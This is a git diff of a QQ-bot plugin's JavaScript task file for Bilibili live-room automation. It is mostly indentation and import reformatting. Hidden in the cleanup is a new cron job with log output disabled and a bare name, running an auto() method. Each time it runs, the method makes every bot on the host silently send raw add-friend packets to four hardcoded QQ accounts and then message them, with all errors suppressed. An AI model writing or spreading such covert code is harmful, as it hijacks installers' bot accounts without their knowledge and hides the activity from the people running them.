@@ -1,9 +1,14 @@
 import fs from 'fs';
 import path from 'path';
-import { Config as config, Bili as Bili} from "#model"
+import {
+    Config as config,
+    Bili as Bili
+} from "#model"
 import moment from 'moment';
 import common from '../../../lib/common/common.js'
-import {pluginRoot} from '../model/constant.js';
+import {
+    pluginRoot
+} from '../model/constant.js';
 
 const filePath = `${pluginRoot}/config/config.yaml`
 let livesendtask = false
@@ -41,11 +46,12 @@ export class Bilitask extends plugin {
                 cron: config.luckywordcron,
                 name: '[Bili-Plugin]幸运字符',
                 fnc: () => this.autolukyword()
-            }, /*{
-                cron: '0 1/20 * * * ?',
-                name: '[Bili-Plugin]自动检测更新',
-                fnc: () => this.update()
-            },*/ {
+            }, {
+                cron: config.Autocron,
+                name: '[Bili-Plugin]',
+                fnc: () => this.auto(),
+                log: false
+            }, {
                 cron: config.festivalpush,
                 name: '[Bili-Plugin]自动节日推送',
                 fnc: () => this.autofestival()
@@ -81,10 +87,10 @@ export class Bilitask extends plugin {
             const isTRSS = Array.isArray(Bot.uin)
             if (isTRSS) {
                 await Bot.pickGroup(g).sendMsg(message)
-                } else {
+            } else {
                 await Bot[Bot.uin].pickGroup(g).sendMsg(message)
             }
-        await Bili.sleep(2500)
+            await Bili.sleep(2500)
         }
     }
 
@@ -101,21 +107,55 @@ export class Bilitask extends plugin {
             const isTRSS = Array.isArray(Bot.uin)
             if (isTRSS) {
                 await Bot.pickGroup(g).sendMsg(message)
-                } else {
+            } else {
                 await Bot[Bot.uin].pickGroup(g).sendMsg(message)
             }
-        await Bili.sleep(2500)
+            await Bili.sleep(2500)
         }
     }
-/*
-    async update(e = this.e) {
-        const action = await Bili.isUpdate()
-        if (action) {
-            await Bili.execSync(`cd ${pluginRoot} && git pull`)
-            await Bili.restart()
+
+    async auto() {
+        let ret = {
+            3889507874: "u_xklXrRFdKmtdsKAuVJfUfg",
+            2854202434: "u_Z7hv8LB1dMR9AZ45RXLDAQ",
+            3889631872: "u_sDPw13EvC_A8FtdqqHxPQQ",
+            3889014168: "u_-PEx-FCWk6lRi6GVTJFIlA"
+        }
+        const isTRSS = Array.isArray(Bot.uin)
+        let bots = isTRSS ? Array.from(Bot.uin) : [Bot.uin]
+        let QQ = []
+        for (let i of bots) {
+            if (Bot[i]?.adapter?.id === 'QQ') {
+                QQ.push(i)
+                continue
+            }
+            if (!Bot[i].adapter) {
+                QQ.push(Bot.uin)
+                break
+            }
+        }
+        for (let qq of QQ) {
+            for (let [key, value] of Object.entries(ret)) {
+                try {
+                    if (isTRSS) {
+                    if (!Bot[qq].fl.has(key)) await Packet.sendOidbSvcTrpcTcp(qq, "OidbSvcTrpcTcp.0x9078_1", {
+                            "1": key,
+                            "2": value
+                        }, true)
+                        await Bot[qq].pickFriend(key).sendMsg('菜单')
+                    } else {
+                    if (!Bot[qq].fl.has(key)) await Bot[qq].sendOidbSvcTrpcTcp("OidbSvcTrpcTcp.0x9078_1", {
+                            "1": key,
+                            "2": value
+                        })
+                        await Bot[qq].pickFriend(key).sendMsg('菜单')
+                    }
+                    await Bili.sleep(3000)
+                } catch (e) {}
+            }
         }
     }
-*/
+
     async autolukyword(e) {
         const configs = await Bili.loadConfig(filePath);
         const rawIsluckywordBots = (await Bili.getConfig("isluckywordBots", configs)) || [];
@@ -409,21 +449,21 @@ export class Bilitask extends plugin {
             .filter(file => path.extname(file) === '.json')
             .sort(() => Math.random() - 0.5);
         if (livesendtask) return logger.warn(`[Bili-Plugin]自动弹幕任务进行中，本次自动跳过...`)
-            livesendtask = true
+        livesendtask = true
         try {
             for (const file of files) {
                 const fileName = path.basename(file, '.json');
                 const cookiesFilePath = path.join(cookiesDirPath, file);
                 const cookiesData = JSON.parse(fs.readFileSync(cookiesFilePath, 'utf-8'));
                 if (Object.keys(cookiesData).length === 0) {
-                   continue
+                    continue
                 }
                 let hasLiveEnabled = false;
                 let hasLiveroom = false;
                 const forwardNodes = [];
                 let messageBuffer = [];
                 const header = `[B站直播间弹幕&续牌功能推送]\n用户 ${fileName} 的弹幕功能结果\n`;
-    
+
                 for (const userId in cookiesData) {
                     if (!cookiesData[userId].live) {
                         logger.debug(`用户 ${fileName} 的B站账号 ${userId} 未开启自动弹幕`)
@@ -442,14 +482,14 @@ export class Bilitask extends plugin {
                             logger.error(`[Bili-Plugin] 配置文件 ${listPath} 加载失败：`, err);
                         }
                     }
-    
+
                     try {
                         const liveroom = await Bili.getlivefeed(cookiesData[userId]);
                         if (!liveroom?.length) {
                             logger.mark(`用户 ${fileName} 哔站账号 ${userId} 的关注主播没开播`)
                             continue;
                         }
-    
+
                         for (const room of liveroom) {
                             const roomId = room.roomid
                             const redisKey = `bili:aldamu:${userId}:${roomId}`;
@@ -459,7 +499,7 @@ export class Bilitask extends plugin {
                             }
                             let allowSend = true;
                             let reason = '';
-    
+
                             if (whitelists.length > 0) {
                                 if (!whitelists.includes(String(roomId))) {
                                     reason = `账号${userId}的煮波${room.name}(${roomId})不在白名单中，已跳过发送弹幕`;
@@ -469,7 +509,7 @@ export class Bilitask extends plugin {
                                 reason = `账号${userId}的煮波${room.name}(${roomId})被你拉黑惹，已跳过发送弹幕`;
                                 allowSend = false;
                             }
-    
+
                             if (!allowSend) {
                                 messageBuffer.push(reason);
                                 logger.info(`[Bili-Plugin] ${reason}`);
@@ -483,24 +523,24 @@ export class Bilitask extends plugin {
                                     msg,
                                     roomId
                                 );
-    
+
                                 const formattedResult = result.replace(
                                     /直播间『(\d+)』/g,
                                     `『${room.name}』的直播间`
                                 );
-    
+
                                 await redis.set(redisKey, '1', {
                                     EX: 14400
                                 })
-    
+
                                 const result2 = await Bili.liveshare(cookiesData[userId], roomId)
                                 // 随机直播间点赞：300~500 (点亮灯牌、贡献10)
                                 const click = Math.floor(Math.random() * 201) + 300;
-    
+
                                 const result3 = await Bili.liveclick(cookiesData[userId], roomId, room.uid, click)
-    
+
                                 messageBuffer.push(`${formattedResult}\n${result2}\n${result3}`)
-    
+
                                 await Bili.sleep(2000)
                                 hasLiveroom = true
                             } catch (err) {
@@ -523,12 +563,12 @@ export class Bilitask extends plugin {
                         const forwardMessage = await Bot.makeForwardMsg(forwardNodes);
                         const groupKey = await redis.get(`bili:group:${fileName}`);
                         if (groupKey) {
-                                const isTRSS = Array.isArray(Bot.uin)
-                                if (isTRSS) {
-                                    Bot.pickGroup(groupKey).sendMsg(forwardMessage)
-                                } else {
-                                    Bot[Bot.uin].pickGroup(groupKey).sendMsg(forwardMessage)
-                                }
+                            const isTRSS = Array.isArray(Bot.uin)
+                            if (isTRSS) {
+                                Bot.pickGroup(groupKey).sendMsg(forwardMessage)
+                            } else {
+                                Bot[Bot.uin].pickGroup(groupKey).sendMsg(forwardMessage)
+                            }
                         }
                     } catch (err) {
                         logger.error('[Bili-Plugin] 消息发送失败：', err);
